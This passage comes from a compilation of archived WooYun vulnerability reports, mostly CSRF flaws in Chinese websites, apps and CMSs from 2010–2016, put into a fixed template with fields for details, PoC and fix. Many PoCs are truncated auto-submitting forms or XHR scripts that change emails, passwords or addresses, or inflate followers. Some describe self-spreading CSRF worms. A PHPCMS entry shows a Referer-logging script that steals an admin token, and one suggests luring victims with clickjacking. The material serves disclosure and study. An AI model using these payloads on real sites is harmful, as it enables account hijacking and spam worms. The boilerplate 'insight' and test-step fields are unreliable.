**POC**: 请看下图 关注成功

**绕过**: 直接利用

**修复**: 增加token就可以了
---

---
### [wooyun-2015-096715] 天下互联旗下哆嗦APP设计不当可导致csrf刷屏
**厂商**: tixa.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商给我打了电话，并且对漏洞十分关注，赞一个我们来说APP把我发个wooyun给他，把数据截取下来，意想不到的是还是GET请求= =我们看下/api_utf/mutual/mShout/replyMShout.jsp?accountId=234641&spaceId=5&receiverAccountId=234678&commentContent=wooyun&appId=327443&appType=80&title=wooyun&lat=23.118978&lng=114.431373&address=%E5%B9%BF%E4%B8%9C%E7%9C%81%E6%83%A0%E5%B7%9E%E5%B8%82%E6%83%A0%E5%9F%8E%E5%8C%BA%E4%BA%91%E5%B1%B1%E4%B8%9C%E8%B7%AF8%E5%8F%B7&fileType=0&file

**POC**: 厂商给我打了电话，并且对漏洞十分关注，赞一个我们来说APP把我发个wooyun给他，把数据截取下来，意想不到的是还是GET请求= =我们看下/api_utf/mutual/mShout/replyMShout.jsp?accountId=234641&spaceId=5&receiverAccountId=234678&commentContent=wooyun&appId=327443&appType=80&title=wooyun&lat=23.118978&lng=114.431373&address=%E5%B9%BF%E4%B8%9C%E7%9C%81%E6%83%A0%E5%B7%

**绕过**: 直接利用

**修复**: 加上token
---

---
### [wooyun-2015-0139645] 国家电网旗下电力宝某处csrf任意修改绑定手机号和邮箱
**厂商**: 某电力央企 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞有两处，存在于账号管理的修改绑定邮箱和修改绑定手机号处漏洞url:https://example.com/[已脱敏]

**POC**: 看我的证明：1.任意修改绑定邮箱我写一个poc表单，命名：phoneOpenUpdate.html，伪造初次设置邮箱的请求，在本地搭个服务器，访问地址：http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 这两处漏洞url做好代码校验:https://example.com/[已脱敏]
---

---
### [wooyun-2011-03863] 手机人人网CSRF
**厂商**: 人人网 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.3g.renren.comreferer检查比较水，只要是https://example.com/[已脱敏]

**POC**: 试试就知道了。。

**绕过**: 直接利用

**修复**: 检查referer啊！！！买本《正则表达式》看看啊！！！
---

---
### [wooyun-2012-04537] CSRF导致某社交平台应用自动授权
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交平台某社交平台对于第三方应用授权使用某社交平台数据，是使用OAuth协议进行认证。第三方应用需要使用用户数据时，需要用户登录后点击授权按钮才可进行。但是由于授权按钮提交表单数据全可预知，因此使用csrf，构造类似表单自动提交，即可让已经登录的用户在不知情的情况下授权第三方应用。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 请注意增加token等措施防范
---

---
### [wooyun-2010-0768] 37wan.com网页游戏平台CSRF漏洞(可更改用户密码)
**厂商**: 37wan | **年份**: 2010 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.等待用户登陆后，诱使点击构造的页面（如可以在游戏聊天里构造链接），可CSRF修改用户的密保问题及答案。2.在找回密码功能里输入密保答案即可修改用户的密码。3.然后......~_^

**POC**: CSRF表单代码：<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="action" value="updateInfo" /><input type="hidden" name="name" value="pig" /><input type="hidden" name="id_card_number" value="110101198601011615" /><input type="hidden" name="question" value="你是猪吗?" 

**绕过**: 直接利用

**修复**: 1.更改密码问题及答案时需要输入密码2.增加用户操作的验证注：其它的网页游戏平台也大多存在此类问题~~
---

---
### [wooyun-2015-0158299] 某社交平台某社交平台一处CSRF可刷粉丝
**厂商**: 某社交平台某社交平台 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <!DOCTYPE HTML><html><body><form id="demo" name="demo" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="3975359730" /><input type="text" name="ispage" value="1" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></f

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2015-0128938] 匹克多处CSRF漏洞
**厂商**: epeaksport.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="nickName" value="wooyun" /><input type="hidden" name="remark" value="wooyun" /><input type="hidden" name="theName" value="wooyun" /><input type="hidden" name="theSex" value="" /><input type="hidden" name="telephone" value="" /><input type="h

**POC**: 修改收货地址<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="addressProvince" value="01&#46;14" /><input type="hidden" name="addressCity" value="01&#46;14&#46;01" /><input type="hidden" name="addressCounty" value="01&#46;14

**绕过**: 直接利用

**修复**: 好痛苦
---

---
### [wooyun-2015-0129972] Zealer_CSRF_头像、简介、发帖、评论(附蠕虫POC)
**厂商**: ZEALER | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我就简单切入主题吧，最近开张了社区（https://example.com/[已脱敏]

**POC**: <html><body><script>function submitRequest(){var xhr = new XMLHttpRequest();xhr.open("POST", "https://example.com/[已脱敏]", true);xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");xh

**绕过**: 直接利用

**修复**: 1、增加token校验；2、建立referer白名单。
---

---
### [wooyun-2013-019683] 某社交平台clickhijacking(不要被你的双眼欺骗)
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 表面上她是这样其实她是这样点击了之后就是这样了是在上次的owasp 2012上面看到的，今天试了下，结果还是可以的当然，这只是一个收听的例子，还可以进行其他的操作。能干的事情还很多，就看你的思路了。比如你完全可以开发些小游戏，如“是男人就把她脱完”，“帮美女脱衣”等的小游戏来诱惑别人“帮你”点击。假设有一个某社交平台的csrf worm，完全可以用这种方式使得用户既玩的开心，又能帮你传播这个csrf worm。总之，思想一定要猥琐。

**POC**: <html><head><title>某社交平台clickjacking</title><script>function showHide_frame() {var text_1 = document.getElementById("target");text_1.style.opacity = this.checked ? "0.5": "0";text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"}</script></head><

**绕过**: 直接利用

**修复**: deny sameorigin
---

---
### [wooyun-2014-061997] 某社交平台绕过CSRF防御（安全设计缺陷）
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交平台csrf检查referer存在问题可用https://example.com/[已脱敏]

**POC**: 新建html<body><form action="https://example.com/[已脱敏]" method="POST"><input type=hidden name="msg" value="hello everybody"></form><script>document.forms[0].submit();</script></body>在网站新建一个www.sohu.com目录 把上面这个html丢在里面例子https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: referer逻辑
---

---
### [wooyun-2015-0125160] 富连网 csrf一枚 随意修改他人收货地址
**厂商**: 富连网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改收货地址1，查看数据包修改成功：创建html，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("address_name=woo88&address_area_province=51&address_area_city=1007&address_area_area=5370&address_area_town=68025&address_deliver_detail=iuh

**POC**: 同上

**绕过**: 直接利用

**修复**: 加token验证referer
---

---
### [wooyun-2014-055075] 原创音乐基地-人人网 OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 中国原创音乐基地 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原创音乐基地-人人网 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个原创音乐基地-人人网  OAuth 2.0 认证请求，并截获OA

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09502] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。漏洞几乎都是处在微女郎这个站。https://example.com/[已脱敏]

**POC**: =========加关注漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="uid" value="1747906692" /></form><script>document.imlonghao.submi

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2014-061443] PHPCMS 组合技进行CSRF攻击
**厂商**: phpcms | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpcms安装好后默认允许申请友情链接。而且友情链接分两种：文字链接和图片链接。其中图片链接，管理员在审核的时候，图片会直接显示后台。而后台url中是包含这个pc_hash的，我们就能在图片的referer里找到这个pc_hash~~岂不妙哉？利用方法见漏洞证明。

**POC**: 首先我在本地简单写了一个获得referer的脚本：<?php$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';file_put_contents('referer.txt', $referer);?>然后把这个脚本作为图片地址，申请友链：管理员在后台访问“友情链接”功能的时候，我已经窃取了其pc_hash：实战中，我们还可以把这个做的像一点。比如用php输出一张真正的logo，这样不但获得了pc_hash，而且还像一个真的申请友链的请求。这时我本地已经获得了referer了：那么，获得了pc_h

**绕过**: 直接利用

**修复**: 没啥好建议。别把pc_hash放在url中。
---

---
### [wooyun-2012-06947] 某互联网公司分站 Apache 漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Apache httponly cookie 泄露，个人认为介算是CSRF...https://example.com/[已脱敏]

**POC**: 1；打开 ： https://example.com/[已脱敏]  截获并修改cookie信息为超长：说明：如果操作成功，只会出现两次，第一次是来至 host: vip.某域名.com第二次来至 host：vipfunc.某域名.com 两次拦截只需将cookie值修改为超长即可，如果有大量的Request去拥抱你，那恭喜！你操作慢了。2；两次拦截并修改操作后，返回400：血色那坨是啥都知道了，跟之前的输入是相对应的，不过Apache的默认配置LimitRequestFieldSize是有最大限度的。这个是对httponly的影响，当然了，这里只是做下重现演示，如果有银精心设计.....你懂得。不晓得其他站有木

**绕过**: 直接利用

**修复**: 做错误处理 or 更新Apache....
---

---
### [wooyun-2013-022582] 街旁网csrf可劫持用户账户
**厂商**: 街旁网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 街旁网更改邮箱处未验证token，可通过攻击者精心构造的一个表单修改掉中招者的邮箱，然后就可以找回密码达到劫持的目的了。由于邮箱需要唯一性，所以可以通过一个数组来随机抽取邮箱。

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org','root8@wooyun.org','root9@wooyun.org','root10@wooyun.o

**绕过**: 直接利用

**修复**: 涉及用户信息的操作一定要验证随机的token求20rank，求礼物
---

---
### [wooyun-2013-026265] 某社交平台csrf删除用户某社交平台
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题依然是：t.hk.某域名.com1.发表一条某社交平台点击删除并抓包，直接GET请求；https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2016-0167674] 某社交平台某社交平台CSRF之点我链接发某社交平台（可蠕虫）
**厂商**: 某社交平台某社交平台 | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 功能在这个页面：https://example.com/[已脱敏]

**POC**: 测试页面<form action="https://example.com/[已脱敏]" method="post"><input type="text" name="id" value="24413"/><input type="text" name="res_name" value="movie"/><input type="text" name="newsid" value="dafen_movietest2_24413"/><input type="text" name="allScore" value="10"/><input type="te

**绕过**: 过滤绕过

**修复**: 照旧
---

---
### [wooyun-2015-0123760] 弹幕网某处SQL注射一枚
**厂商**: 弹幕网 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: (int)
---

---
### [wooyun-2014-078786] 盛大游戏社区-批量刷粉丝
**厂商**: 盛大在线 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 盛大游戏社区https://example.com/[已脱敏]

**POC**: 想测试csrf，但是无奈小菜不会玩。就只刷个粉丝测试下。。关注：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 问：挖掘机技术哪家强！？
---

---
### [wooyun-2014-080153] PageAdmin CSRF漏洞#2
**厂商**: pageadmin.net | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-075352] 某社交平台某社交平台csrf刷粉丝
**厂商**: 某社交平台 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有对referer验证，没有加token导致登陆https://example.com/[已脱敏] nba官方社区点击关注 抓包 只有uid。。

**POC**: 构造poc<!DOCTYPE HTML><html><body><form id="demo" name="demo" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="3138469231" /><input type="submit" value="submit" /></form><script>document.demo.submit();</script></body></html>这是我没访问之前的关注访问之后页面虽

**绕过**: 直接利用

**修复**: 验证referer，增加token
---

---
### [wooyun-2015-0124159] 6间房任意刷关注（从此主播翻身上首页）
**厂商**: 六间房 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ~~

**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]"><input type="hidden" name="tuid" value="38015632" /><input type="hidden" name="act" value="p" /><input type="hidden" name="format" value="json" /></form></body><script>document.for

**绕过**: 直接利用

**修复**: token等
---

---
### [wooyun-2013-025342] 音悦台 ，无限刷粉丝，已经蠕虫，无限粉丝中传播
**厂商**: 音悦台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意间看见的一个忽略的bug评论上面信息得到是使用的request然后顺藤摸瓜得到发某社交平台的请求地址：然后发现 发某社交平台的时候图片地址没有限制或者过滤，那么我们就用img 的 src 来构造 csrf蠕虫 传播某社交平台https://example.com/[已脱敏]

**POC**: 被感染关注好友。。f  的意思是加粉丝c  的意思就是创建f那条某社交平台完成关注我 继续帮我传播..

**绕过**: 直接利用

**修复**: 注意csrf
---

---
### [wooyun-2013-046515] 某个人中心CSRF删除指定用户的某社交平台
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某个人中心删除某社交平台功能为设计缺陷，可造成用户某社交平台被删除。Ox1 . 删除个人某社交平台的时候调用接口https://example.com/[已脱敏] . 当攻击者精心构造带有恶意攻击的链接便可造成用户某社交平台被删除。用户点击后-------------------我是分割线-------------------上次提交的时候，wooyun没给通过，可能的却比较鸡肋吧，小菜确实不会挖厉害的漏洞。某个人中心刷粉。0x1 '我的某门户网站'跟随功能，会发送一个GET请求，格式如下： https://example.com/[已脱敏]

**POC**: 见详细。

**绕过**: 编码绕过

**修复**: 你们更专业
---

---
### [wooyun-2015-0120484] 某视频网站、某门户网站用户中心多个业务可劫持任意帐号
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 上传功能

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次配置星号，导致任意劫持漏洞：https://example.com/[已脱敏]

**POC**: 如上~

**绕过**: 直接利用

**修复**: 同步上传过滤代码,覆盖整个业务线。
---

---
### [wooyun-2014-077157] appcms设计权限备份数据库可直接下载
**厂商**: appcms.cc | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: appcms设计缺陷，备份数据库存放在web目录下，并且使用固定文件名存储，所以不需要windows短文件名的限制，只要备份过数据库，就可以直接下载。可以结合csrf备份数据库。请求可以csrf，get请求。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028888] 奇异某分站flash跨域漏洞(带测试实现code)
**厂商**: 奇艺 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看crossdomain.xml<?xml version="1.0"?><cross-domain-policy> <site-control permitted-cross-domain-policies="all" /><allow-access-from domain="*" /><allow-http-request-headers-from domain="*" headers="*"/></cross-domain-policy>1：permitted-cross-domain-policies为all造成加载目标域上的任何文件作为跨域策略文件，甚至是一 个JPG也可被加载为策略文件！[使用此选项那就等着被xx吧！]2：allow-access-from 设为“*”任何的域，有权限通过flash读取本域中的内容。3：allow-http-request-headers-fro

**POC**: 个人首页url：https://example.com/[已脱敏] flash.net.*;var mytest:String = "hello";var myloader = new URLLoader(new URLRequest("https://example.com/[已脱敏]"));myloader.addEventListener(Event.COMPLETE,test);myloader.load();function test(event:Event)

**绕过**: 直接利用

**修复**: crossdomain.xml控制好
---

---
### [wooyun-2013-037311] 多玩YY空间处未token导致Wrom(多处)
**厂商**: 广州多玩 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: postdata:articleTitle=fuck!&articleContent=tester~

**POC**: POST /feed/issueArticle.do HTTP/1.1Host: z.yy.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflatebody响应头：<li jd

**绕过**: 直接利用

**修复**: token..给个10rank不过分吧?
---

---
### [wooyun-2013-043893] 某互联网公司MXDCSRF评论影响某社交平台、空间
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 访问：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2013-035905] 找小说网某处CSRF可刷关注
**厂商**: zhaoxiaoshuo.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里攻击者：wooyun这里受害者：xfkxfk1、先看看xfkxfk关注的书友：再看看wooyun的粉丝情况：2、然后wooyun用户个xfkxfk用户发私信，私信的内容就是构造好的关注wooyun自己的连接：3、看看xfkxfk收到的短消息，然后点击了短消息中的连接地址：4、这是xfkxfk已经关注了wooyun：xfkxfk的关注的书友增加了wooyunwooyun用户的粉丝增加了xfkxfk

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 防御csrf
---

---
### [wooyun-2015-0107308] 无忧精英网CSRF漏洞
**厂商**: 无忧精英网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、首先我们进修改邮箱这个链接二、抓包，竟然没有token我们写个简单的表单好得接下来我们就让用户你打开表单。我就本地测试不放在服务器上了！我已经打开恶意的链接了，看截图

**POC**: 用户名是zxcqianxiao邮箱是443开头的某邮箱服务再看我点击邮箱里的邮件整个漏洞过程就是这样

**绕过**: 直接利用

**修复**: 增加验证！token
---

---
### [wooyun-2014-066667] 某社区CSRF一枚
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一个链接刷关注。没有检测referer，也没有防csrfToken。加关注的数据包如下：POST /?action=friend_create&controller=ajax HTTP/1.1Host: i.club.sohu.comtp=baodabuping_sohu%40sohu.com&remark=&group_id=tp改为自己的某门户网站用户id就行（不是昵称）一个链接就能加关注，CSRF利用示例链接如下：https://example.com/[已脱敏]

**POC**: 某门户网站用户点击上述示例链接，就会自动对某账号加关注

**绕过**: 直接利用

**修复**: 加强csrf防护
---

---
### [wooyun-2013-046101] 某搜索引擎贴吧某功能CSRF漏洞callback参数问题
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 虽然表面上没有变化，但是修复过，知道连接被修复过的原因就是，&callback参数后面&_=的参数上星期测试的时候去掉是成功的，但是这星期去掉就失败了，说明&_=参数被修复过了，只要&_=不存在就会失败,如图.....2.从上面的图片可以看出，同一时间段截获的GET请求，但是去掉&_=参数,失败，加上&_=参数成功，所以我肯定这里判断了&_=的参数3.这个&callback为了准确，我打开了北京时间,记录第一次截获GET请求的时间,如图4.接下来每隔几分钟，我就截图一次,如图(1)(2)（3）（4）5.根据上面的图片的观察，我并没有去掉&_=的参数，可还是会失败，经过几次测试，发现失败的原因就是&callback过期了，大概在10分钟之内是有效的6.有的人会说，就算知道这样，设置csrf连接再加上发给对方的时间，早就超过10分钟了，但是因为旧的不去新的不来啊,于是我又新截获一个请求，

**POC**: (1)(2)（3）（4）

**绕过**: 直接利用

**修复**: 先判断了&_=被修复过，再测试&callback的数值存在的问题,鸡肋的地方就是10分钟左右连接失效，因为影响因素很多，比如对方掉线，吃饭去了，或者网吧没钱了等等因素,10分钟就可能没访问到，不一定要一开始就插入连接，可以配合社会工程学，和他聊天，不之不觉把连接插入图片,修复的建议就是&callba
---

---
### [wooyun-2015-0114566] Discuz!论坛CSRF一处
**厂商**: Discuz! | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本：x3.2，论坛需要开启广播功能（全局-->站点功能）。当访问一个url时，可取消收听指定用户http://[IP已脱敏]

**POC**: 收听一个用户，确定该用户的uid，比方说是1访问如下第三方也没就可取消啊收听<img src="http://[IP已脱敏]

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2015-0126749] 云贝的消费请求是GET存在CSRF
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 请求：GET /cloud-web/integral/consume.htm?priId=1 HTTP/1.1响应：{"consume":0}

**POC**: 弄个img，发get<img src="https://example.com/[已脱敏]">

**绕过**: 直接利用

**修复**: 改成pos请求
---

---
### [wooyun-2013-045223] 派代网主站设计缺陷可删除任意文章
**厂商**: 派代网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 派代网主站设计缺陷可删除任意文章注册了2个号。在主站可以直接发文章。然后我抓了包https://example.com/[已脱敏] 删除文章的。然后另外一个号 发一个文章。然后直接提交这个链接  文章就删除了https://example.com/[已脱敏] 攻击吧。

**POC**: 同上

**绕过**: 直接利用

**修复**: 这是 csrf 还是越权？
---

---
### [wooyun-2015-0101709] 折800任意添加信息漏洞
**厂商**: 折800 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 折800添加地址处没有token验证，导致crsf1、用户添加收货地址处：https://example.com/[已脱敏] 写一个表单提交请求4、返回了地址了id号，添加成功

**POC**: RT

**绕过**: 直接利用

**修复**: 加token验证
---

---
### [wooyun-2015-0125243] 娇妍商城CSRF可导致修改用户收货地址
**厂商**: 娇妍商城 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="&#95;method" value="POST" /><input type="hidden" name="data&#91;Member&#93;&#91;consignee&#93;" value="1234" /><input type="hidden" name="data&#91;Member&#93;&#91;province&#93;" value="5" /><input type="hidden" name="data&#91;Member&#93;&#91;city&#93;" value="65" /><input type="hidden" name="

**POC**: ~~

**绕过**: 直接利用

**修复**: token~~
---

---
### [wooyun-2015-0140031] 美食天下csrf随意修改他人个人信息
**厂商**: 美食天下 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

